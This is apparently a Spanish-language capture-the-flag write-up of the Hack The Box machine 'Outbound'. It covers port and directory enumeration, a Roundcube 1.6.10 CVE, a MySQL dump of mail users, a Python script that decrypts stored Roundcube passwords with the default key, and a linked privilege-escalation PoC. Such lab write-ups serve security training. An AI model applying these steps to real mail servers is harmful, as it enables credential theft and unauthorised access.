---

title: "Outbound Hack The Box"
date: "2025-09-10"
description: "Explotacion de vulnerabilidad Roundcube 1.6.10"
difficulty: "Easy"
tags: ["nmap", "gobuster", "ssh", "sudo -l"]


---

![Banner SoulMate](/img/Outbound.png)
---

#### Credenciales Entregadas Por HTB 

tyler: LhKL1o9Nm3X2 

---
### 🔎 Escaneo y Enumeración

---

#### 📌 Escaneos


- Comando usado:
```bash    
nmap -sSCV -p- --open -T4 -Pn -n -vvv -oN escaneo_nmap.txt -oX escaneo_nmap.xml <IP>
```

#### 📦 Puertos y Servicios Descubiertos


- Captura:

```bash

 PORT   STATE SERVICE REASON         VERSION
 
  22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
 
  80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)

  http-title: Did not follow redirect to http://mail.outbound.htb/
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
---

- WhatWeb: HTTPServer Ubuntu Linux nginx/1.24.0 (Ubuntu), Redirect Location mail.outbound.htb , nginx 1.24.0

---

#### 🌐 Enumeración Web

- Comandos Utilisados:
    
```bash
gobuster dir -u http://<IP> -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 50 -b <NO-STATUS>
```
---

- Hallazgos


mail.outbound.htb <br>
outbound.htb

---



#### 🔍 Vulnerabilidades

- CVE: `CVE-2025-49113`
    
- Versiones Encontradas: `Roundcube 1.6.10`


---

## 💥 Explotación


Comandos:

```bash
mysql -u roundcube -pRCDBPass2025 -D roundcube
```

Resultado: 

```bash

# SELECT * FROM users;

user_id username         mail_host  
                 
3       tyler     localhost       {s:11:"client_hash";s:16:"2aezFDLvMZhM0VRa";i:0;b:0;}
1       jacob     localhost       {s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
2       mel       localhost       {s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}

# SHOW TABLES;

cache
cache_index
cache_messages
cache_shared
cache_thread
collected_addresses
contactgroupmembers
contactgroups
contacts
dictionary
filestore
identities
responses
searches
session
system
users

```

Decodificador:

```bash

import base64
from Crypto.Cipher import DES3

key = b'rcmail-!24ByteDESkey*Str'
def rcube_decrypt(cipher_b64, key):
    cipher_raw = base64.b64decode(cipher_b64)
    iv = cipher_raw[:8]
    ciphertext = cipher_raw[8:]
    cipher = DES3.new(key, DES3.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)
    pad_len = plaintext[-1]
    return plaintext[:-pad_len].decode(errors="ignore")

cipher_b64 = "bL9uVf9w35H/YQC75uyDjo1d/RR/zsUU"
print(rcube_decrypt(cipher_b64, key))
```
---


#### 🔗 Credenciales encontradas

-  Usuario: `jacob`
    
-  Contraseña: `595mO8DmwGeD`

-  Origen (FTP/SSH/Web): `MAIL PORTAL`

POC: https://github.com/BridgerAlderson/CVE-2025-27591-PoC/blob/main/exploit.py


---


#### 📂 Resumen


-  Método: `Pivoting, Reastic abuse privilege`
    
-  Nivel de Acceso: `root`